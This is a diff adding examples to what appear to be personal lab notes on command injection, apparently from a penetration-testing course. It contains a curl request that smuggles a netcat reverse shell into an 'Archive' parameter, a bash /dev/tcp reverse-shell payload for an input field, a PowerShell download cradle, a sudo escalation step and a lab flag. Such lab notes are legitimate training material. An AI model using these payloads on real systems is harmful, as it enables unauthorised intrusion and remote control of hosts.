@@ -492,3 +492,16 @@ $ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).D
 
 We should also inject a PS reverse shell directly instead of using Powercat.
 
+Extra examples:
+
+```console
+// to get reverse shell on linux
+$ nc -nlvp 4444
+// new terminal
+$ curl -X POST --data 'Archive=git+version%3Bnc+192.168.45.224+4444+-e+/bin/bash' http://192.168.195.16/archive
+// in nc terminal, elevate privileges in the shell
+> sudo su
+OS{d6209f10da9ecb87805d12feeb922e86}
+```
+
+Input field example, after nc listener is started: ffa=test"&&bash -c "bash -i >& /dev/tcp/222.222.222.222/4444 0>&1"&&whoami"  // if using curl, ensure this is encoded.
